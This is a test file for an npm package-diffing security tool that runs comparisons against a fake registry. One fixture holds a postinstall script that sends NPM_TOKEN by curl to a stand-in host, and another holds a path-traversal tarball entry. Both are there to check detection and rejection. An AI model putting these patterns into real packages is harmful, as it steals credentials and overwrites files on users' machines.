import { describe, it, expect, afterEach } from "vitest";
import { mkdtemp, rm } from "node:fs/promises";
import path from "node:path";
import os from "node:os";
import { compare } from "../../src/index.js";
import { startFakeRegistry, type FakeRegistry } from "../helpers/fake-registry.js";
import { IntegrityError, ArchiveSafetyError } from "../../src/errors/errors.js";

let registry: FakeRegistry | undefined;
let cacheDir: string | undefined;

afterEach(async () => {
  await registry?.close();
  registry = undefined;
  if (cacheDir) await rm(cacheDir, { recursive: true, force: true });
  cacheDir = undefined;
});

async function freshCacheDir(): Promise<string> {
  cacheDir = await mkdtemp(path.join(os.tmpdir(), "depcanary-cache-"));
  return cacheDir;
}

describe("compare() end-to-end against a local fake registry", () => {
  it("finds no introduced behavior when comparing a version to itself", async () => {
    registry = await startFakeRegistry([
      {
        name: "demo-pkg",
        versions: [
          { version: "1.0.0", manifest: { name: "demo-pkg", version: "1.0.0" } },
          { version: "1.0.0-b", manifest: { name: "demo-pkg", version: "1.0.0-b" } }
        ],
        distTags: { latest: "1.0.0-b" }
      }
    ]);
    const dir = await freshCacheDir();
    const result = await compare("demo-pkg@1.0.0", "demo-pkg@1.0.0-b", {
      registry: registry.url,
      cacheDir: dir,
      cache: false
    });
    expect(result.findings).toHaveLength(0);
    expect(result.risk).toBe("low");
  });

  it("reports a new postinstall script as HIGH/CRITICAL and computes a non-trivial score", async () => {
    registry = await startFakeRegistry([
      {
        name: "risky-pkg",
        versions: [
          { version: "1.0.0", manifest: { name: "risky-pkg", version: "1.0.0" } },
          {
            version: "2.0.0",
            manifest: {
              name: "risky-pkg",
              version: "2.0.0",
              scripts: { postinstall: "node scripts/setup.js" }
            },
            files: {
              "scripts/setup.js":
                'const { execSync } = require("child_process");\n' +
                "const token = process.env.NPM_TOKEN;\n" +
                'execSync("curl https://telemetry.example.invalid/beacon?t=" + token);\n'
            }
          }
        ]
      }
    ]);
    const dir = await freshCacheDir();
    const result = await compare("risky-pkg@1.0.0", "risky-pkg@2.0.0", {
      registry: registry.url,
      cacheDir: dir,
      cache: false
    });
    const codes = result.findings.map((f) => f.code).sort();
    expect(codes).toContain("DC001");
    expect(codes).toContain("DC002");
    expect(codes).toContain("DC003");
    expect(codes).toContain("DC005");
    expect(["high", "critical"]).toContain(result.risk);
    expect(result.score).toBeGreaterThan(30);
  });

  it("does not re-report unchanged risky behavior present in both versions", async () => {
    const manifest = { scripts: { postinstall: "node setup.js" } };
    const files = { "setup.js": 'require("child_process").execSync("echo hi");\n' };
    registry = await startFakeRegistry([
      {
        name: "stable-cli",
        versions: [
          {
            version: "1.0.0",
            manifest: { name: "stable-cli", version: "1.0.0", ...manifest },
            files
          },
          {
            version: "1.0.1",
            manifest: { name: "stable-cli", version: "1.0.1", ...manifest },
            files
          }
        ]
      }
    ]);
    const dir = await freshCacheDir();
    const result = await compare("stable-cli@1.0.0", "stable-cli@1.0.1", {
      registry: registry.url,
      cacheDir: dir,
      cache: false
    });
    expect(result.findings).toHaveLength(0);
  });

  it("rejects a package with a corrupted tarball via integrity verification", async () => {
    registry = await startFakeRegistry([
      {
        name: "corrupt-pkg",
        versions: [
          { version: "1.0.0", manifest: { name: "corrupt-pkg", version: "1.0.0" } },
          { version: "1.0.1", manifest: { name: "corrupt-pkg", version: "1.0.1" }, corrupt: true }
        ]
      }
    ]);
    const dir = await freshCacheDir();
    await expect(
      compare("corrupt-pkg@1.0.0", "corrupt-pkg@1.0.1", {
        registry: registry.url,
        cacheDir: dir,
        cache: false
      })
    ).rejects.toThrow(IntegrityError);
  });

  it("rejects a tarball containing a path-traversal entry", async () => {
    registry = await startFakeRegistry([
      {
        name: "evil-tar",
        versions: [
          { version: "1.0.0", manifest: { name: "evil-tar", version: "1.0.0" } },
          {
            version: "1.0.1",
            manifest: { name: "evil-tar", version: "1.0.1" },
            rawEntries: [{ path: "../../etc/evil.txt", content: "pwned", type: "File" }]
          }
        ]
      }
    ]);
    const dir = await freshCacheDir();
    await expect(
      compare("evil-tar@1.0.0", "evil-tar@1.0.1", {
        registry: registry.url,
        cacheDir: dir,
        cache: false
      })
    ).rejects.toThrow(ArchiveSafetyError);
  });

  it("rejects a diff between two different package names", async () => {
    registry = await startFakeRegistry([
      {
        name: "pkg-a",
        versions: [{ version: "1.0.0", manifest: { name: "pkg-a", version: "1.0.0" } }]
      },
      {
        name: "pkg-b",
        versions: [{ version: "1.0.0", manifest: { name: "pkg-b", version: "1.0.0" } }]
      }
    ]);
    const dir = await freshCacheDir();
    await expect(
      compare("pkg-a@1.0.0", "pkg-b@1.0.0", { registry: registry.url, cacheDir: dir, cache: false })
    ).rejects.toThrow(/same package name/);
  });
});
